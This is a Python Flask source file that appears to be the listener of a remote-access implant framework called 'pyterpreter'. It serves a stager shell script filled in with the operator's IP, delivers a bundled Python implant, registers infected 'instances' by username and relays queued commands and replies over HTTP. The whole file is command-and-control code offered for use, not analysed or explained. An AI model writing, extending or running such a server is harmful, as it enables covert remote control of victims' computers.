from flask import Flask, send_from_directory, redirect, request
from pinliner import pinliner
from threading import Thread
from queue import Empty
import os
import logging

from core.message import Message

import instance_manager

LOCAL_IP = '127.0.0.1'
PORT = 1337

app = Flask(__name__)
log = logging.getLogger('werkzeug')
log.level = logging.WARNING


def get_available_scripts():
    scripts = []
    for file in os.listdir('resources'):
        path = os.path.join('resources', file)
        if os.path.isfile(path) and file != 'stager.sh':
            scripts.append(path)
    return scripts


def get_file_with_subs(file, subs: dict):
    with open(f'resources/{file}') as fh:
        data = fh.read()
    for key, value in subs.items():
        data = data.replace(f'<{key}>', value)
    return data


@app.route('/')
def stager():
    return redirect('/resources/stager.sh')


@app.route('/resources/<resource>')
def get_resource(resource):
    if resource == 'pyterpreter.py':
        class DummyOutfile:
            contents: str

            def __init__(self):
                self.contents = ''

            def write(self, data: str):
                self.contents += data

            def close(self):
                pass

            def tell(self) -> int:
                return len(self.contents)

        class CFG:
            default_package = 'pyterpreter'
            outfile = DummyOutfile()
            packages = ['pyterpreter', 'core']
            set_hook = None
            tagging = False

        pinliner.process_files(CFG)
        return CFG.outfile.contents

    elif resource == 'stager.sh':
        return get_file_with_subs(resource, {
            'LOCAL_IP': LOCAL_IP,
            'WEBSERVER_PORT': '1337'
        })

    return send_from_directory('resources', resource)


@app.route('/instances', methods=['POST'])
def create_instance():
    username = request.data.decode()
    print(f'created with username {username}')
    instance = instance_manager.create_instance(username)
    return instance.instance_id


@app.route('/instances/<instance_id>')
def messaging(instance_id):
    instance = instance_manager.get_by_id(instance_id)
    if instance is None:
        return 'Not Found', 404
    if request.method == 'POST':
        message = Message.from_string(request.data.decode())
        instance.messages_received.put(message)
        return ''
    else:
        messages = []
        try:
            message = instance.messages_to_send.get_nowait()
            messages.append(message)
            # print(f'Sending message {message}')
        except Empty:
            pass
        return '\n'.join([message.to_string() for message in messages])


def start(blocking=False):
    if not blocking:
        Thread(target=start, args=(True,), daemon=True).start()
    else:
        app.run('0.0.0.0', PORT, debug=False)
